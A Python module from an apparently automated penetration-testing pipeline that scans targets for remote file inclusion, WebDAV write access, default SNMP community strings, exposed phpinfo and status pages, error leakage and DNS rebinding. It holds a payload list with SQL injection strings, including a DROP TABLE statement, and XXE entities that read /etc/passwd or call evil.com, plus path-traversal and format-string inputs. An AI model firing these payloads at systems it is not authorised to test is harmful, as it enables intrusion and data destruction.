"""Network and infrastructure discovery phases: RFI, WebDAV, SNMP, banners, phpinfo, error leakage, wildcard DNS, DNS rebinding."""
import string
from reconchain.phases.helpers import *


# ── Local helper functions ─────────────────────────────────────────

_SERVICE_VERSION_RE = re.compile(
    r"(?:version|v)[\s:=]*(\d+(?:\.\d+){0,3})"
    r"|(\d+\.\d+(?:\.\d+){0,2}(?:[-_]\w+)?)",
    re.IGNORECASE,
)


def _grab_banner(host: str, port: int, timeout: int = 5) -> str:
    """Connect to host:port and return the first line of the banner (TCP)."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        data = sock.recv(MAX_RECV)
        sock.close()
        return data.decode("utf-8", errors="replace").strip().splitlines()[0][:200] if data else ""
    except Exception:
        return ""


def _extract_service_version(banner: str) -> str:
    """Extract a version string from a service banner."""
    m = _SERVICE_VERSION_RE.search(banner)
    if m:
        return m.group(1) or m.group(2) or "unknown"
    return "unknown"


def _generate_random_subdomains(domain: str, count: int) -> List[str]:
    """Generate random subdomains for wildcard DNS testing."""
    subs: List[str] = []
    for _ in range(count):
        label = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 16)))
        subs.append(f"{label}.{domain}")
    return subs


def _resolve_host(hostname: str) -> List[str]:
    """Resolve a hostname to a list of IP addresses (blocking)."""
    try:
        results = socket.getaddrinfo(hostname, None, socket.AF_INET)
        return list({r[4][0] for r in results})
    except Exception:
        return []


async def phase_112_RFI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"112-RFI"}:
        return {}
    _out = outdir / "rfi_findings.txt"
    if _out.exists() and not force:
        return {"112-RFI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 112-RFI: Remote file inclusion")
    oast_domain = prev.get("oast_domain", "") if isinstance(prev, dict) else ""
    findings: List[str] = []
    _rfi_urlopen = _get_urlopener()
    _rfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "112-RFI: no URLs; skipping")
        return {"112-RFI": str(_out), "count": 0}
    rfi_params = {"file", "include", "template", "page", "load", "path", "doc", "pg",
                  "folder", "root", "inc", "loc", "site", "show", "view", "content",
                  "document", "import", "require", "read", "dir", "url", "uri"}
    sample = getattr(_PIPELINE_CFG, 'sample_urls_rfi', 20)
    rfi_candidates = [u for u in all_urls if "=" in u and any(p + "=" in u.lower() for p in rfi_params)][:sample]
    if not rfi_candidates:
        log("warn", "112-RFI: no candidate URLs with RFI parameters; skipping")
        return {"112-RFI": str(_out), "count": 0}
    for url in rfi_candidates:
        await _throttle_rate()
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            modified = False
            for pname, pvals in list(params.items()):
                if pname.lower() in rfi_params:
                    for payload in [
                        f"http://{oast_domain}/rfi-test.txt" if oast_domain else "https://example.com/test.txt",
                        "https://example.com/test.txt",
                        f"http://{oast_domain}/rfi-test.php" if oast_domain else "http://test.rfi-check.com/test",
                    ]:
                        params[pname] = [payload]
                        new_qs = urllib.parse.urlencode(params, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        try:
                            req = urllib.request.Request(test_url,
                                headers={"User-Agent": "Mozilla/5.0", **_rfi_extra_headers})
                            status, _, resp_body = await _async_urlopen(_rfi_urlopen, req, timeout=10)
                            body_lower = resp_body.decode("utf-8", errors="ignore").lower()
                            hints = []
                            if "example.com" in body_lower or "test.txt" in body_lower:
                                hints.append("content_reflected")
                            if status in (200, 302) and "include" in body_lower:
                                hints.append("include_possible")
                            if hints or status not in (404, 403):
                                hint_str = ",".join(hints) if hints else f"http_{status}"
                                findings.append(
                                    f"[rfi-candidate] {url.split('?')[0]} param={pname} "
                                    f"payload={payload[:80]} response_hint={hint_str}"
                                )
                                modified = True
                                break
                        except Exception:
                            continue
                    if modified:
                        break
        except Exception:
            continue
    if not findings:
        findings.append("[rfi] No RFI candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"112-RFI: {len(findings)} findings → {out}")
    return {"112-RFI": str(out), "count": len(findings)}


async def phase_113_WEBDAV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"113-WEBDAV"}:
        return {}
    _out = outdir / "webdav_enumeration.txt"
    if _out.exists() and not force:
        return {"113-WEBDAV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 113-WEBDAV: WebDAV enumeration")
    findings: List[str] = []
    _wd_urlopen = _get_urlopener()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "113-WEBDAV: no hosts; skipping")
        return {"113-WEBDAV": str(_out), "count": 0}
    webdav_methods = {"PUT", "DELETE", "MKCOL", "COPY", "MOVE", "PROPFIND", "LOCK", "UNLOCK"}
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_webdav', 10)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            try:
                req = urllib.request.Request(base, method="OPTIONS",
                    headers={"User-Agent": "Mozilla/5.0"})
                req_opener = _get_no_redirect_urlopener()
                s, headers, _ = await _async_urlopen_no_redirect(req_opener, req, timeout=10)
                if s not in (200, 401, 403):
                    continue
                allow = headers.get("allow", headers.get("Allow", ""))
                dav_header = headers.get("dav", headers.get("DAV", ""))
                allowed_methods = {m.strip().upper() for m in allow.split(",") if m.strip()}
                enabled = allowed_methods & webdav_methods
                if enabled or dav_header:
                    methods_str = ", ".join(sorted(enabled)) if enabled else dav_header
                    findings.append(f"[webdav-enabled] {host_clean} methods={methods_str}")
                    webdav_xml = '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>'
                    try:
                        prop_req = urllib.request.Request(base, data=webdav_xml.encode(), method="PROPFIND",
                            headers={
                                "User-Agent": "Mozilla/5.0",
                                "Content-Type": "application/xml",
                                "Depth": "1",
                            })
                        ps, _, pb = await _async_urlopen_no_redirect(req_opener, prop_req, timeout=10)
                        if ps in (200, 207, 301, 302):
                            body = pb.decode("utf-8", errors="ignore")
                            paths = re.findall(r'<D:href>([^<]+)</D:href>', body, re.I)
                            if not paths:
                                paths = re.findall(r'<href>([^<]+)</href>', body, re.I)
                            for p in paths[:20]:
                                findings.append(f"[webdav-enum] {host_clean} path={p[:200]}")
                    except Exception:
                        pass
                    if "PUT" in enabled:
                        test_content = b"webdav-test-file-" + str(time.time()).encode()
                        test_path = "/.reconchain_webdav_test.txt"
                        try:
                            put_req = urllib.request.Request(
                                base + test_path, data=test_content, method="PUT",
                                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "text/plain"},
                            )
                            ps, _, _ = await _async_urlopen_no_redirect(req_opener, put_req, timeout=10)
                            if ps in (200, 201, 204):
                                findings.append(f"[webdav-writable] {host_clean} path={test_path}")
                                del_req = urllib.request.Request(
                                    base + test_path, method="DELETE",
                                    headers={"User-Agent": "Mozilla/5.0"},
                                )
                                try:
                                    await _async_urlopen_no_redirect(req_opener, del_req, timeout=10)
                                except Exception:
                                    pass
                        except Exception:
                            pass
                break
            except Exception:
                continue
    if not findings:
        findings.append("[webdav] No WebDAV services found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"113-WEBDAV: {len(findings)} findings → {out}")
    return {"113-WEBDAV": str(out), "count": len(findings)}

async def phase_114_SNMP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"114-SNMP"}:
        return {}
    _out = outdir / "snmp_findings.txt"
    if _out.exists() and not force:
        return {"114-SNMP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 114-SNMP: SNMP community string brute-force")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "114-SNMP: no hosts; skipping")
        return {"114-SNMP": str(_out), "count": 0}
    community_strings = ["public", "private", "manager", "admin", "snmp", "monitor",
                         "read", "write", "test", "secret", "c0de", "all", "default"]
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_snmp', 10)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        try:
            resolved = socket.gethostbyname(host_clean)
        except socket.gaierror:
            continue
        has_nmap = False
        # Clear proxy env vars for nmap — raw/stealth packets can't route through SOCKS
        _nmap_saved = {v: os.environ.pop(v, None) for v in _PROXY_CLEAR_VARS}
        try:
            result = subprocess.run(
                ["nmap", "--version"],
                capture_output=True, text=True, timeout=5,
            )
            has_nmap = result.returncode == 0
        except Exception:
            has_nmap = False
        if has_nmap:
            for community in community_strings:
                try:
                    result = subprocess.run(
                        ["nmap", "-sU", "-p", "161", "--script", "snmp-brute",
                         "--script-args", f"snmp-brute.communitiesdb={community}",
                         "-Pn", "--host-timeout", "30s", resolved],
                        capture_output=True, text=True, timeout=60,
                    )
                    output = result.stdout + result.stderr
                    if community in output.lower() and ("open" in output.lower() or "valid" in output.lower() or "discovered" in output.lower()):
                        findings.append(f"[snmp-community] {host_clean} community={community}")
                        enum_result = subprocess.run(
                            ["nmap", "-sU", "-p", "161", "--script", "snmp-info",
                             "-Pn", "--host-timeout", "30s", resolved],
                            capture_output=True, text=True, timeout=60,
                        )
                        enum_output = enum_result.stdout + enum_result.stderr
                        lines = [l.strip() for l in enum_output.splitlines() if l.strip()]
                        info = "; ".join(lines[:10])[:300]
                        if info:
                            findings.append(f"[snmp-enum] {host_clean} info={info}")
                        break
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
        else:
            for community in community_strings:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(3)
                    comm_bytes = community.encode()
                    inner_content = (
                        b"\x02\x01\x01"  # version = 1
                        + b"\x04" + bytes([len(comm_bytes)]) + comm_bytes  # community
                        + b"\xa0\x1c" + (  # GetRequest PDU
                            b"\x02\x04\x00\x00\x00\x01"  # request-id
                            b"\x02\x01\x00"  # error = 0
                            b"\x02\x01\x00"  # error-index = 0
                            b"\x30\x0e\x30\x0c"  # varbind list
                            b"\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00"  # sysDescr OID
                            b"\x05\x00"  # NULL
                        )
                    )
                    inner_len = len(inner_content)
                    snmp_req = b"\x30" + bytes([inner_len]) + inner_content
                    sock.sendto(snmp_req, (resolved, 161))
                    data, _ = sock.recvfrom(4096)
                    if data and len(data) > 20:
                        # SNMP response is ASN.1/BER — check if it looks like a real SNMP response
                        if data[0] == 0x30:  # ASN.1 SEQUENCE tag
                            findings.append(f"[snmp-community] {host_clean} community={community}")
                            findings.append(f"[snmp-enum] {host_clean} info=snmp response received (community valid)")
                        else:
                            findings.append(f"[snmp-tested] {host_clean} community={community} (non-SNMP response)")
                        break
                except socket.timeout:
                    continue
                except Exception:
                    continue
                finally:
                    if sock is not None:
                        try:
                            sock.close()
                        except Exception:
                            pass
        # Restore proxy env vars
        for v, val in _nmap_saved.items():
            if val is not None:
                os.environ[v] = val
            else:
                os.environ.pop(v, None)
    if not findings:
        findings.append("[snmp] No SNMP community strings discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"114-SNMP: {len(findings)} findings → {out}")
    return {"114-SNMP": str(out), "count": len(findings)}

async def phase_115_BANNER(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"115-BANNER"}:
        return {}
    _out = outdir / "banners.txt"
    if _out.exists() and not force:
        return {"115-BANNER": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 115-BANNER: SSH/FTP banner grabbing")

    # Collect hosts from ports.txt or hosts.txt
    hosts_ports: Dict[str, set] = {}  # host -> set of ports
    ports_file = outdir / "ports.txt"
    if ports_file.exists():
        for ln in read_lines(ports_file):
            ln = ln.strip()
            if not ln:
                continue
            if ":" in ln:
                h, p = ln.rsplit(":", 1)
                try:
                    port = int(p)
                    hosts_ports.setdefault(h.strip(), set()).add(port)
                except ValueError:
                    hosts_ports.setdefault(ln.strip(), set())
            else:
                hosts_ports.setdefault(ln.strip(), set())
    if not hosts_ports:
        for h in _load_live_hosts(outdir):
            hosts_ports.setdefault(h, set())

    if not hosts_ports:
        log("warn", "115-BANNER: no hosts found; skipping")
        return {"115-BANNER": str(_out), "count": 0}

    service_ports = [22, 21, 23, 3389]
    sample_size = min(len(hosts_ports), _PIPELINE_CFG.sample_hosts_banner)
    sampled_hosts = list(hosts_ports.items())[:sample_size]

    findings: List[str] = []
    loop = asyncio.get_event_loop()
    banner_results = await asyncio.gather(*[
        loop.run_in_executor(None, _grab_banner, host, port)
        for host, ports in sampled_hosts
        for port in (ports & set(service_ports) or service_ports)
    ])
    idx = 0
    for host, ports in sampled_hosts:
        probe_ports = ports & set(service_ports) or service_ports
        for port in probe_ports:
            banner = banner_results[idx]
            idx += 1
            if banner:
                svc_name = {22: "SSH", 21: "FTP", 23: "Telnet", 3389: "RDP"}.get(port, str(port))
                version = _extract_service_version(banner)
                findings.append(
                    f"[banner] {host}:{port} service={svc_name} version={version} banner={banner[:120]}"
                )

    if not findings:
        findings.append("[banner] No banners retrieved (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"115-BANNER: {len(findings)} banners → {out}")
    return {"115-BANNER": str(out), "count": len(findings)}


# ────────────────── Phase 116-PHPINFO: phpinfo() Disclosure ─────────────────


_PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/test.php", "/i.php",
    "/php.php", "/pi.php", "/status.php", "/debug.php",
]
_PHPINFO_INDICATORS = ["PHP Version", "php.ini", "System", "Loaded Configuration", "PHP Credits"]

async def phase_116_PHPINFO(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"116-PHPINFO"}:
        return {}
    _out = outdir / "phpinfo_disclosure.txt"
    if _out.exists() and not force:
        return {"116-PHPINFO": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 116-PHPINFO: phpinfo() disclosure detection")
    all_hosts = _load_live_hosts(outdir)
    if not all_hosts:
        log("warn", "116-PHPINFO: no live hosts; skipping")
        return {"116-PHPINFO": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    targets = [f"https://{h}" if not h.startswith("http") else h for h in all_hosts][:_PIPELINE_CFG.sample_hosts_phpinfo]

    async def _probe_phpinfo(base: str) -> List[str]:
        results: List[str] = []
        for path in _PHPINFO_PATHS:
            url = base.rstrip("/") + path
            await _throttle_rate()
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                if any(ind in body for ind in _PHPINFO_INDICATORS):
                    php_ver = "unknown"
                    m = re.search(r'<tr><td class="e">PHP Version </td><td class="v">([^<]+)</td></tr>', body)
                    if m:
                        php_ver = m.group(1)
                    modules: List[str] = re.findall(
                        r'<tr><td class="e">([^<]+)</td><td class="v">(?:enabled|disabled)', body
                    )
                    mod_str = ",".join(sorted(set(modules)))[:200]
                    disabled = re.findall(
                        r'<tr><td class="e">([^<]+)</td><td class="v"><i>disabled</i>', body
                    )
                    env_vars = ""
                    env_section = re.search(
                        r'<tr><td class="e">(?:PHP|User/HTTP) (?:Environment|Variables).*?<tbody>(.*?)</tbody>',
                        body, re.DOTALL,
                    )
                    if env_section:
                        env_vars = env_section.group(1)[:100]
                    detail_parts = [f"php_version={php_ver}"]
                    if mod_str:
                        detail_parts.append(f"modules={mod_str}")
                    if disabled:
                        detail_parts.append(f"disabled_functions={','.join(disabled)[:100]}")
                    if env_vars:
                        detail_parts.append(f"env={env_vars.strip()}")
                    detail = " ".join(detail_parts)
                    results.append(f"[phpinfo] {base} path={path} {detail}")
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_phpinfo(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[phpinfo] No phpinfo() disclosures found (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"116-PHPINFO: {len(findings)} findings → {out}")
    return {"116-PHPINFO": str(out), "count": len(findings)}


# ────────────────── Phase 117-SRVSTATUS: Server Status Exposure ─────────────


_SERVER_STATUS_PATHS = [
    "/server-status", "/server-info",
    "/nginx_status", "/fStatus",
]
_SERVER_STATUS_INDICATORS: Dict[str, List[str]] = {
    "Apache": [
        "Server Version:", "Server Built:", "Current Time:", "Restart Time:",
        "Parent Server Generation:", "Total Accesses:", "Total kBytes:",
    ],
    "Nginx": [
        "Active connections:", "server accepts handled requests",
        "Reading:", "Writing:", "Waiting:",
    ],
    "lighttpd": [
        "lighttpd", "fStatus", "uptime",
    ],
}


async def phase_117_SRVSTATUS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"117-SRVSTATUS"}:
        return {}
    _out = outdir / "server_status_exposed.txt"
    if _out.exists() and not force:
        return {"117-SRVSTATUS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 117-SRVSTATUS: server status page exposure detection")
    all_hosts = _load_live_hosts(outdir)
    if not all_hosts:
        log("warn", "117-SRVSTATUS: no live hosts; skipping")
        return {"117-SRVSTATUS": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    targets = [f"https://{h}" if not h.startswith("http") else h for h in all_hosts][:_PIPELINE_CFG.sample_hosts_srvstatus]

    async def _probe_status(base: str) -> List[str]:
        results: List[str] = []
        for path in _SERVER_STATUS_PATHS:
            url = base.rstrip("/") + path
            await _throttle_rate()
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                for server_type, indicators in _SERVER_STATUS_INDICATORS.items():
                    if any(ind in body for ind in indicators):
                        snippet = body[:300].replace("\n", " ").strip()
                        results.append(
                            f"[status-exposed] {base} path={path} server_type={server_type} leaked_data={snippet[:200]}"
                        )
                        break
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_status(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[status-exposed] No server status pages exposed (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"117-SRVSTATUS: {len(findings)} findings → {out}")
    return {"117-SRVSTATUS": str(out), "count": len(findings)}

_ERRORLEAK_PAYLOADS = [
    ("sqli", "'"),
    ("sqli", "1' OR '1'='1"),
    ("sqli", "1' OR '1'='1' --"),
    ("sqli", "1' UNION SELECT NULL--"),
    ("sqli", "1' UNION SELECT NULL,NULL,NULL--"),
    ("sqli", '1" OR "1"="1'),
    ("sqli", "1; DROP TABLE users--"),
    ("xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
    ("xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/">]>'),
    ("path", "../../../../etc/passwd"),
    ("path", "....//....//....//etc/passwd"),
    ("null", "%00"),
    ("null", "test%00.php"),
    ("long", "A" * 5000),
    ("long", "B" * 10000),
    ("special", "..\\..\\..\\windows\\win.ini"),
    ("special", "../../../etc/passwd%00"),
    ("special", "index.php%00"),
    ("unicode", "\u0000\u0001\u0002\u0003"),
    ("format", "%s%s%s%s%s%s%s%s%s%s"),
    ("format", "%n%n%n%n%n%n%n%n%n%n"),
    ("overflow", "-1"),
    ("overflow", "2147483648"),
    ("overflow", "9" * 100),
]

_ERRORLEAK_INDICATORS = [
    # Stack traces
    ("stacktrace", re.compile(r'Stack trace:|at\s+\S+\.\w+\(|Traceback \(most recent call last\)|#\d+\s+\S+\.\w+')),
    ("sql-leak", re.compile(r'SQL syntax.*MySQL|Warning.*mysql_|PostgreSQL.*ERROR|SQLSTATE|Driver.*SQL|Unclosed quotation mark|Incorrect syntax near')),
    ("db-version", re.compile(r'MySQL server version|PostgreSQL [\d.]+|SQLite version|Oracle [\d.]+|MariaDB [\d.]+')),
    ("filepath", re.compile(r'(/var/www/[^\s<>"\'\)]+|/home/[^\s<>"\'\)]+|C:\\[^\s<>"\'\)]+|/usr/local/[^\s<>"\'\)]+)')),
    ("framework", re.compile(r'(Symfony|Laravel|Django|Rails|Spring|Express|Koa|Flask|CodeIgniter|CakePHP|Zend|Phalcon|Yii|ASP\.NET)')),
    ("php-error", re.compile(r'(Fatal error|Parse error|Notice|Warning|Deprecated):\s+\S+ in /')),
    ("java-error", re.compile(r'(Exception|Error) in thread|java\.lang\.\w+Exception|javax\.')),
    ("full-path", re.compile(r'<b>Warning</b>.*<b>/.*</b>')),
    ("xml-error", re.compile(r'(XML parsing error|XML declaration allowed only at the start|parser error : )')),
    ("debug-info", re.compile(r'(DEBUG|TRACE|LOG|DUMP|VAR_DUMP|print_r)\s*[:\(]', re.I)),
]

async def phase_118_ERRORLEAK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"118-ERRORLEAK"}:
        return {}
    _out = outdir / "error_leakage.txt"
    if _out.exists() and not force:
        return {"118-ERRORLEAK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 118-ERRORLEAK: error page information leakage detection")
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "118-ERRORLEAK: no URLs; skipping")
        return {"118-ERRORLEAK": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_errorleak]
    if not param_urls:
        log("warn", "118-ERRORLEAK: no parameter-bearing URLs; skipping")
        return {"118-ERRORLEAK": str(_out), "count": 0}

    async def _probe_leak(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for ptype, payload in _ERRORLEAK_PAYLOADS[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                    status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    for leak_type, pattern in _ERRORLEAK_INDICATORS:
                        m = pattern.search(body)
                        if m:
                            detail = m.group(0)[:200].replace("\n", " ").strip()
                            results.append(
                                f"[error-leak] {url} param={pname} type={leak_type} detail={detail}"
                            )
                            break
                except urllib.error.HTTPError as e:
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore")
                        for leak_type, pattern in _ERRORLEAK_INDICATORS:
                            m = pattern.search(err_body)
                            if m:
                                detail = m.group(0)[:200].replace("\n", " ").strip()
                                results.append(
                                    f"[error-leak] {url} param={pname} type={leak_type} detail={detail}"
                                )
                                break
                    except Exception:
                        pass
                except Exception:
                    continue
        return results

    probe_results = await asyncio.gather(*[_probe_leak(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[error-leak] No error information leakage detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"118-ERRORLEAK: {len(findings)} findings → {out}")
    return {"118-ERRORLEAK": str(out), "count": len(findings)}

async def phase_119_WILDCARDDNS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"119-WILDCARDDNS"}:
        return {}
    _out = outdir / "wildcard_dns.txt"
    if _out.exists() and not force:
        return {"119-WILDCARDDNS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 119-WILDCARDDNS: wildcard DNS detection")
    findings: List[str] = []
    count = max(5, min(10, _PIPELINE_CFG.sample_hosts_wildcarddns))
    random_subs = _generate_random_subdomains(domain, count)
    loop = asyncio.get_event_loop()
    resolve_tasks = [loop.run_in_executor(None, _resolve_host, sub) for sub in random_subs]
    results = await asyncio.gather(*resolve_tasks)
    resolved_count = sum(1 for ips in results if ips)
    if resolved_count >= count * 0.8:
        sample_ips = ",".join(results[0]) if results[0] else "unknown"
        log("warn", f"119-WILDCARDDNS: wildcard DNS detected for {domain} — {resolved_count}/{count} random subdomains resolved")
        findings.append(f"[wildcard-detected] {domain} resolves_to={sample_ips} count={resolved_count}")
        for sub, ips in zip(random_subs, results):
            if ips:
                findings.append(f"  {sub} -> {','.join(ips)}")
    else:
        findings.append(f"[no-wildcard] {domain} — only {resolved_count}/{count} random subdomains resolved (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"119-WILDCARDDNS: {len(findings)} findings → {out}")
    return {"119-WILDCARDDNS": str(out), "count": len(findings)}


# ────────────────── Phase 120-DNSREBIND: DNS Rebinding Detection ─────────────


def _is_private_ip(ip: str) -> bool:
    """Check if an IP address falls within private/loopback ranges."""
    try:
        parts = [int(x) for x in ip.split(".")]
        if len(parts) != 4:
            return False
        return (
            parts[0] == 10
            or (parts[0] == 172 and 16 <= parts[1] <= 31)
            or (parts[0] == 192 and parts[1] == 168)
            or parts[0] == 127
            or parts[0] == 0
            or (parts[0] == 169 and parts[1] == 254)
            or (parts[0] == 100 and 64 <= parts[1] <= 127)
            or (parts[0] == 198 and parts[1] in (18, 19))
            or (parts[0] == 192 and parts[1] == 0)
            or (parts[0] == 192 and parts[1] == 2)
            or (parts[0] == 198 and parts[1] == 51)
            or (parts[0] == 203 and parts[1] == 0)
        )
    except (ValueError, IndexError):
        return False


async def phase_120_DNSREBIND(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"120-DNSREBIND"}:
        return {}
    _out = outdir / "dns_rebinding.txt"
    if _out.exists() and not force:
        return {"120-DNSREBIND": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 120-DNSREBIND: DNS rebinding detection")
    findings: List[str] = []
    loop = asyncio.get_event_loop()
    # First DNS query
    first_ips = await loop.run_in_executor(None, _resolve_host, domain)
    if not first_ips:
        findings.append(f"[dns-rebind] {domain} — could not resolve; skipping")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"120-DNSREBIND: {len(findings)} findings → {out}")
        return {"120-DNSREBIND": str(out), "count": len(findings)}

    # Check for private IPs
    private_ips = [ip for ip in first_ips if _is_private_ip(ip)]
    if private_ips:
        for ip in private_ips:
            findings.append(f"[dns-private-ip] {domain} ip={ip}")
    else:
        findings.append(f"[dns-rebind] {domain} resolves to public IP(s): {','.join(first_ips[:5])}")

    # Second DNS query after short delay to check for alternating resolution
    await asyncio.sleep(2)
    second_ips = await loop.run_in_executor(None, _resolve_host, domain)
    if second_ips and second_ips != first_ips:
        first_private = any(_is_private_ip(ip) for ip in first_ips)
        second_private = any(_is_private_ip(ip) for ip in second_ips)
        if first_private != second_private:
            findings.append(
                f"[dns-rebind-suspect] {domain} first_ip={','.join(first_ips)} second_ip={','.join(second_ips)}"
            )
    if not findings:
        findings.append(f"[dns-rebind] {domain} — no DNS rebinding indicators detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"120-DNSREBIND: {len(findings)} findings → {out}")
    return {"120-DNSREBIND": str(out), "count": len(findings)}
